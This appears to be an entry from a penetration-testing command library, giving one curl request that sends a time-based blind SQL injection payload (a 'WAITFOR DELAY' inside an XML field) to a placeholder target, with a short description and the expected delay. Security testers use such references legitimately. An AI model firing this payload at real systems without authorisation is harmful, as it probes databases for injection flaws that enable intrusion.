---
id: c-curl-time-delay
data: >-
  curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123 AND
  1=1; WAITFOR DELAY "0:0:5"--</MainAccount></xml>'
  http://target-subdomain.example.com/upload
tags:
  - sqli
  - blind
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.277Z'
verified: false
validated: true
submitted: true
---
# curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123 AND 1=1; WAITFOR DELAY "0:0:5"--</MainAccount></xml>' http://target-subdomain.example.com/upload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123 AND 1=1; WAITFOR DELAY "0:0:5"--</MainAccount></xml>' http://target-subdomain.example.com/upload
```

## Description

Tests time-based blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Delay payload | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

5-second response delay.

## Related

- [[procedures/Develop-Time-Based-Blind-SQLi-Payload]]
